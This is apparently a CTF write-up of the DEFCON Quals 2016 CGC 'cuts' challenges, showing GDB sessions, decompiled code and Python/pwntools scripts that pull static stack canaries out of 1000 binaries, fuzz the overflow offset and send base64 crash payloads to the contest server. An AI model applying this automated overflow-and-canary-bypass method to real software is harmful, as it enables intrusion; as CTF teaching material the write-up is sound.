# DEFCON QUALS 2016 – 334 CUTS, 666 CUTS AND 1000 CUTS CGC CHALLENGES

Defcon is over for another year. Well I think the guys went ahead and redefined what constitutes a good CTF yet again. Hard and focused, but very good and I don’t know how I feel about going back to other CTFs now. Still let’s move forward with a discussion about these trio of Cyber Grand Challenge binary problems we received over the weekend.

I was initially intimidated when I saw the Legit BS team post that we needed to get familiar with Decree and CGC concepts. I had only dealt with it for 1 or 2 challenges in 2015 at Defcon. This year we were faced with a wall of CGC challenges including a Baby’s First CGC CB “easy-prasky”.

These three challenges involve a group of binaries, each containing a trivial stack overflow vulnerability, each featuring a “stack canary” protection mechanism. The stack canaries are static values stored in the binary and then copied to the stack during the function prologue. These values are then are checked when the vulnerable function returns. If a stack overflow had corrupted memory during that function’s execution the “stack canary” value would have also been overwritten and so execution is aborted before any nasty arbitrary code is executed.

Yeah sounds super easy but we had 1000 of these to solve over 3 challenges and we’re using the CGC platform here so we don’t have all our fun toys at run time.

My solution is naive and seemingly trivial (to me). Except it’s fast, automated and solves all 1000 challenge binaries without fuss. So why didn’t everyone do it this way (who knows?!). I read on IRC after the conclusion that a lot of folks used IDA scripting. That’s cool too and I’d like to learn to do that. Anyways, let’s run through 1 example and then show how I automated it:

Taking the example of “easy-prasky”, we receive a CGC format binary which takes a string on stdin and does nothing except emit the string “canary ok” and exits.

```
vagrant@crs:/vagrant$ uname -a
Linux crs 3.13.11-ckt21-cgc #1 SMP Mon Feb 29 16:42:11 UTC 2016 i686 GNU/Linux
vagrant@crs:/vagrant$ file easy-prasky-with-buffalo-on-bing 
easy-prasky-with-buffalo-on-bing: CGC 32-bit LSB executable, (CGC/Linux)
vagrant@crs:/vagrant$ ./easy-prasky-with-buffalo-on-bing 
AAAAA
canary ok
```

If the string is larger than the allocated stack memory, our canary is overwritten and we receive “hacking detected” error message.

```
vagrant@crs:/vagrant$ ./easy-prasky-with-buffalo-on-bing 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
hacking detected, see ya
```

We use GDB w/Peda (because Peda works in CGC btw) and step through the execution, we find that our stack space available is 20 bytes before we begin overwriting the canary. We can see the difference in sending 19 bytes at 0x804832b it compares EAX and ECX which are both ‘l’. It loops doing this compare 4 times for each byte then returns true.

```
[----------------------------------registers-----------------------------------]
EAX: 0x6c ('l')
ECX: 0x6c ('l')
EIP: 0x804832b (cmp    eax,ecx)
[-------------------------------------code-------------------------------------]
=> 0x804832b:  cmp    eax,ecx
[------------------------------------------------------------------------------]
0x0804832b in ?? ()
gdb-peda$ 
```

If we send exactly 20 bytes, we see it compares ECX = ‘l’ and EAX = 0x00 because we have the null at the end of our 20 bytes of ‘A’s in the first byte of the canary:

```

[----------------------------------registers-----------------------------------]
EAX: 0x0 
ECX: 0x6c ('l')
[-------------------------------------code-------------------------------------]
=> 0x804832b:  cmp    eax,ecx
[------------------------------------------------------------------------------]
0x0804832b in ?? ()
gdb-peda$ 
```

You can use cgc2elf to convert CGC binary format files to ELF format and IDA Pro will load them up nicely. Here’s the function we exploit. You can see it matches exactly our expectations, including the check_canary() call seems to have an argument of “4”. Probably canary length.

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [sp+2Fh] [bp-29h]@1
  char canary; // [sp+43h] [bp-15h]@1
  set_canary(&canary, "lddwDrwhkTEBSya_", 17);
  read_input(&buf);
  if ( !check_canary(&canary, "lddwDrwhkTEBSya_", 4) )
  {
    printmsg("hacking detected, see ya");
    terminate(-1);
  }
  return printmsg("canary ok");
}
```

So if we use an input string of ‘A’ * 20 + ‘lddw’ + ‘A’ * 30 we see we successfully pass the canary validation because it only checks 32 bits and ‘lddw’ is in our canary location. Cool!

```
gdb-peda$ r
Starting program: /vagrant/easy-prasky-with-buffalo-on-bing 
AAAAAAAAAAAAAAAAAAAAlddw
[----------------------------------registers-----------------------------------]
EAX: 0x6c ('l')
ECX: 0x6c ('l')
EIP: 0x804832b (cmp    eax,ecx)
[-------------------------------------code-------------------------------------]
=> 0x804832b:  cmp    eax,ecx
[------------------------------------------------------------------------------]
0x0804832b in ?? ()
gdb-peda$ 
```

So to summarize, a naive but successful approach can have these properties:

- Find the canary value.
- Find the offset of the input string where the canary is checked by fuzz testing between ‘canary ok’ and ‘hacking detected’ messages
- Send the string and canary. Validate our binary works. It should output ‘canary ok’ with some string with strlen > our strlen found in step 2

Interesting is the approach we took for #1. I found that using ‘strings’ on the binary for strings >= 8 bytes and then filtering out some static strings we could always locate an accurate canary value. So we just used that in the solution you’ll see later.

```
vagrant@crs:~/cuts/334_cuts$ strings -n 8 easy-prasky-with-buffalo-on-bing 
lddwDrwhkTEBSya_        # Canary
hacking detected, see ya    # Static for every binary
canary ok            # Static for every binary
clang-cgc version 3.4 (9085)  # Static for every binary
.shstrtab            # Static for every binary
.comment            # Static for every binary
```

When submitting the solution we find for our binary, we must send a base64 encoded string which, when decoded and input into the target binary will successfully bypass the canary and successfully crash (segfault) the program.

We automated this as below, we found this approach worked for all three challenges with no code changes.

```
#!/usr/bin/python
from subprocess import PIPE, Popen, check_output, call
import glob
import base64
print "[*] Extracting challenges..."
[call(['tar','xf',c]) for c in ['1000_cuts.tar.bz2','334_cuts.tar.bz2','666_cuts.tar.bz2']]
print "[*] Loading all canaries..."
canaries = {}
for r in check_output(["strings -f -n 8 334_cuts/easy* 666_cuts/* 1000_cuts/* | grep -Ev 'hacking|canary|clang|shstrtab|comment'"], shell=True).splitlines():
    fname, canary = r.split(': ')
    canaries[fname] = [canary]
print "[*] Loaded canaries for",len(canaries),"files"
dbout = open('hakdb.txt','w') # save them for later
print "[*] Fuzzing all files..."
for k in canaries:
    if 'xml' in k:
        continue
    print "[*] Fuzzing",k
    for i in range(8,200):
        p = Popen(['./'+k],stdout=PIPE,stdin=PIPE)
        stdout = p.communicate(('A' * i) + "\n")[0]
        if 'hacking' in stdout:
            print "[*] Hacking detected at len",i
            canaries[k].append(i)
            cbytes = canaries[k][0][:4]
            payload = "A" * i
            payload += cbytes
            payload += "C\n"
            p = Popen(['./'+k],stdout=PIPE,stdin=PIPE)
            stdout = p.communicate(payload)[0]
            if 'canary' in stdout:
                print "[*] Canary bypassed with payload ",i,cbytes
                crashpayload = base64.b64encode(payload[:-1] + "D" * 34 + "\n")
                canaries[k].append(crashpayload)
                dbout.write(k+":"+repr(canaries[k])+"\n")
            break
dbout.close()    
print "[*] Data written to hakdb.txt"
```


```
vagrant@crs:~/cuts$ ./cuts.py 
[*] Extracting challenges...
[*] Loading all canaries...
[*] Loaded canaries for 1002 files
[*] Fuzzing all files...
[*] Fuzzing 1000_cuts/hard-stornoway-with-muhammara-on-hubuz
[*] Hacking detected at len 124
[*] Canary bypassed with payload  124 fPYv
[*] Fuzzing 666_cuts/medium-drisheen-with-twekesbury-on-cholermus
[*] Hacking detected at len 67
[*] Canary bypassed with payload  67 -qLz
[*] Fuzzing 1000_cuts/hard-oxford-with-duckefett-on-bazin
[*] Hacking detected at len 69
[*] Canary bypassed with payload  69 ilVc
[*] Fuzzing 334_cuts/easy-krakowska-with-mayonnaise-on-challah
[*] Hacking detected at len 33
[*] Canary bypassed with payload  33 gV55
[*] Fuzzing 1000_cuts/hard-haggis-with-bernaise-on-doubledown
[*] Hacking detected at len 93
[*] Canary bypassed with payload  93 7eqv
[*] Data written to hakdb.txt
vagrant@crs:~/cuts$ wc -l hakdb.txt 
1000 hakdb.txt
1000_cuts/hard-stornoway-with-muhammara-on-hubuz:['fPYvGPxCuNk=', 124, 'QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWZQWXZDRERERERERERERERERERERERERERERERERERERERERERERAo=']
666_cuts/medium-drisheen-with-twekesbury-on-cholermus:['-qLzOEjn', 67, 'QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQS1xTHpDRERERERERERERERERERERERERERERERERERERERERERERAo=']
1000_cuts/hard-oxford-with-duckefett-on-bazin:['ilVcuWGDvztdUgVqjw==', 69, 'QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBaWxWY0NERERERERERERERERERERERERERERERERERERERERERERECg==']
334_cuts/easy-krakowska-with-mayonnaise-on-challah:['gV55iet42uI=', 33, 'QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBZ1Y1NUNERERERERERERERERERERERERERERERERERERERERERERECg==']
666_cuts/medium-snorker-with-marierose-on-potbrood:['x_SxyJe8MQ==', 80, 'QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF4X1N4Q0REREREREREREREREREREREREREREREREREREREREREREQK']
```

Now we have our attack strings in a flat file database, we simply need to attack the server as such:

```
#!/usr/bin/python
from pwn import *
host = '1000_cuts_1bf4f5b0948106ad8102b7cb141182a2.quals.shallweplayaga.me'
port = 11000
db = [x.strip() for x in open('hakdb.txt','r').readlines()]
crashstrings = {}
for line in db:
    target,data = line.split(':',1)
    target = target.split('/')[1]
    data = eval(data)
    crashstrings[target] = data[2]
conn = remote(host,port)
banner = conn.recvline()
while True:
    target = conn.recvline()
    if 'flag' in target:
        print "[-] flag: ",target
        conn.close()
        break
    print "[*] Target is ",target
    conn.sendline(crashstrings[target.strip()])
```

